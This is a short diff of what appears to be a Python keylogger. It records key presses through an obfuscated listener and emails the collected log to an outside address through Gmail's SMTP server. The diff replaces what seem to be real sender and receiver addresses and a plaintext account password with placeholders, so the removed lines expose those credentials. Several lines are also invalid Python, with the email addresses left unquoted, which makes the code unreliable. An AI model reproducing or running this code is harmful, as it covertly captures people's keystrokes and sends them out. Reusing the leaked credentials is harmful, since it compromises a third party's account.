@@ -28,8 +28,8 @@ def H():
 
 def send_email():
     # Email configurations
-    sender_email = "jemc5414@gmail.com"
-    receiver_email = "wickedjaybusiness@gmail.com"
+    sender_email = "email@gmail.com"
+    receiver_email = "email@gmail.com"
     subject = "Log File"
     body = "Please find the attached log file."
 
@@ -64,8 +64,8 @@ def send_email():
 
     # Send email using Gmail SMTP server
     with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
-        server.login(jemc5414@gmail.com, "Jacob1003!")
-        server.sendmail(jemc5414@gmail.com, wickedjaybusiness@gmail.com, text)
+        server.login(email@gmail.com, "Password")
+        server.sendmail(email@gmail.com, email@gmail.com, text)
 
 with A(on_press=E) as M:
     M.join()
